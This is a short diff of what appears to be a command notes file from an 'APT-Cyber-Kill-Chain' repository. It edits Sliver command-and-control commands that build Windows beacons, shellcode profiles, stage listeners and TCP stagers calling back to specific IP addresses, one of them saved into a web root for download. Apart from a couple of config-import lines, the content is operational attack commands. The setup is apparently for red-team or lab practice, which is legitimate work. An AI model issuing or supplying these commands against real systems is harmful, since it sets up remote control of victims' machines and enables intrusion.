@@ -25,7 +25,7 @@ generate beacon --mtls 192.168.216.14:8080 --os windows --arch amd64 --format ex
 profiles new --mtls 18.143.102.216:8080 --skip-symbols --format shellcode --arch amd64 win64
 stage-listener --url tcp://18.143.102.216:1234 --profile win64
 jobs
-generate stager --lhost 18.143.102.216 --lport 1234 --protocol tcp --arch amd64 --format c --save /var/www/html
+generate stager --lhost 18.143.102.216 --lport 1234 --protocol tcp --arch amd64 --format c --save ./win_stager.c
 
 profiles new --mtls 18.143.102.216:8080 --format shellcode win-shellcode
 generate stager --lhost 10.0.149.9 --lport 1234 --protocol tcp --arch amd64 --format ps1 --save /tmp
@@ -50,4 +50,4 @@ ls ./tools/sliver/client_configs
 ls /var/www/apt_domain/configs
 ls /home/kali/.sliver-client/configs
 
-sliver-client import /home/kali/git-test/APT-Cyber-Kill-Chain//tools/sliver/client_configs/
+sliver-client import /home/kali/git-test/APT-Cyber-Kill-Chain//tools/sliver/client_configs/20120083_18.143.102.216.cfg
